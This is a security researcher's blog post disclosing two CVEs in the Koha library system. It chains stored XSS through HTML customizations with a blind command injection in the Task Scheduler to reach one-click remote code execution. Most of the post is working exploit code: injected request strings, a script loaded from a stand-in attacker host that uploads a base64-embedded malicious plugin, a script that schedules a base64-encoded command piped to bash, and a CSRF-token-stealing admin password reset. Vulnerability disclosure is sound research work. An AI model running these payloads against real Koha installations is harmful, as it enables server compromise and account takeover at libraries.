=== Content from febin0x4e4a.wordpress.com_6f00e28e_20250111_030123.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[cybersecurity](https://febin0x4e4a.wordpress.com/tag/cybersecurity/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [javascript](https://febin0x4e4a.wordpress.com/tag/javascript/), [security](https://febin0x4e4a.wordpress.com/tag/security/)

# Post navigation

[← CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)[Privilege Escalation Vulnerability in Balena Etcher Software →](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)

### Leave a comment [Cancel reply](/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50)](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + [Customize](https://febin0x4e4a.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2j)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/143)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


